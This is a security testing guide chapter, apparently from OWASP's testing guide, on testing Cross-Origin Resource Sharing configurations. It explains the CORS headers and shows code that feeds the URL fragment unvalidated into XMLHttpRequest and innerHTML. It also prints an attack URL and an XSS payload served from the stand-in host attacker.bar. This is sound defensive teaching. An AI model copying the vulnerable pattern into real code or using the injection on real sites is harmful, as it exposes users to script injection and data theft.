# Testing Cross Origin Resource Sharing

|ID          |
|------------|
|WSTG-CLNT-07|

## Summary

[Cross origin resource sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest L2 API in a controlled manner. In the past, the XMLHttpRequest L1 API only allowed requests to be sent within the same origin as it was restricted by the same origin policy.

Cross-origin requests have an origin header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP [headers](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) are used to accomplish this.

The [W3C CORS specification](https://www.w3.org/TR/cors/) mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.

### Origin & Access-Control-Allow-Origin

The origin header is always sent by the browser in a CORS request and indicates the origin of the request. The origin header can not be changed from JavaScript however relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, so you still need to check that application-level protocols are used to protect sensitive data.

Access-Control-Allow-Origin is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.

From a penetration testing perspective you should look for insecure configurations as for example using a `*` wildcard as value of the Access-Control-Allow-Origin header that means all domains are allowed. Other insecure example is when the server returns back the origin header without any additional checks, what can lead to access of sensitive data. Note that this configuration is very insecure, and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.

### Access-Control-Request-Method & Access-Control-Allow-Method

The Access-Control-Request-Method header is used when a browser performs a preflight OPTIONS request and let the client indicate the request method of the final request. On the other hand, the Access-Control-Allow-Method is a response header used by the server to describe the methods the clients are allowed to use.

### Access-Control-Request-Headers & Access-Control-Allow-Headers

These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.

### Access-Control-Allow-Credentials

This header as part of a preflight request indicates that the final request can include user credentials.

### Input Validation

XMLHttpRequest L2 (or XHR L2) introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.

### Other Headers

There are other headers involved like Access-Control-Max-Age that determines the time a preflight request can be cached in the browser, or Access-Control-Expose-Headers that indicates which headers are safe to expose to the API of a CORS API specification, both are response headers specified in the CORS W3C document.

## Test Objectives

- Identify endpoints that implement CORS.
- Ensure that the CORS configuration is secure or harmless.

## How to Test

A tool such as [ZAP](https://www.zaproxy.org) can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input. Below are some examples:

### Example 1: Insecure Response with Wildcard `*` in Access-Control-Allow-Origin

Request `http://attacker.bar/test.php` (note the 'origin' header):

```http
GET /test.php HTTP/1.1
Host: attacker.bar
[...]
Referer: http://example.foo/CORSexample1.html
Origin: http://example.foo
Connection: keep-alive
```

Response (note the 'Access-Control-Allow-Origin' header:)

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

### Example 2: Input Validation Issue: XSS with CORS

This code makes a request to the resource passed after the `#` character in the URL, initially used to get resources in the same server.

Vulnerable code:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

For example, a request like this will show the contents of the `profile.php` file:

`http://example.foo/main.php#profile.php`

Request and response generated by `http://example.foo/profile.php`:

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: http://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the `example.foo` domain, with a URL like this:

```text
http://example.foo/main.php#http://attacker.bar/file.php
```

Request and response generated by `http://attacker.bar/file.php`:

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: http://example.foo/main.php
origin: http://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```
